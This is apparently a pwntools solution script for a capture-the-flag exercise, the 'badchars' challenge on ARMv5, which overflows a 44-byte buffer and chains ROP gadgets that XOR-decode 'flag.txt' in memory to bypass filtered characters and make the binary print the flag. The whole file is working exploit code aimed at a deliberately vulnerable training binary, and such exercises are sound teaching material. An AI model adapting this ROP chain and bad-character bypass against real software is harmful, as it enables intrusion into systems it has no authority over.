#!/usr/bin/python3
from pwn import process, p32, xor, log

shell = process("./badchars_armv5")

offset = 44
junk = b"A" * offset

string = xor(b"flag.txt", 2)

data = 0x21024

print_file = p32(0x105e0)

pop_r5_r6_pc = p32(0x10614)
ldr_r1_r5_eor_r1_r1_r6_str_r1_r5_pop_r0_pc = p32(0x10618)

payload  = b""
payload += junk
payload += pop_r5_r6_pc + p32(data) + p32(0x02020202)
payload += ldr_r1_r5_eor_r1_r1_r6_str_r1_r5_pop_r0_pc + b"A" * 4
payload += pop_r5_r6_pc + p32(data) + string[:4]
payload += ldr_r1_r5_eor_r1_r1_r6_str_r1_r5_pop_r0_pc + b"A" * 4
payload += pop_r5_r6_pc + p32(data + 4) + p32(0x02020202)
payload += ldr_r1_r5_eor_r1_r1_r6_str_r1_r5_pop_r0_pc + b"A" * 4
payload += pop_r5_r6_pc + p32(data + 4) + string[4:]
payload += ldr_r1_r5_eor_r1_r1_r6_str_r1_r5_pop_r0_pc
payload += p32(data) + print_file

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
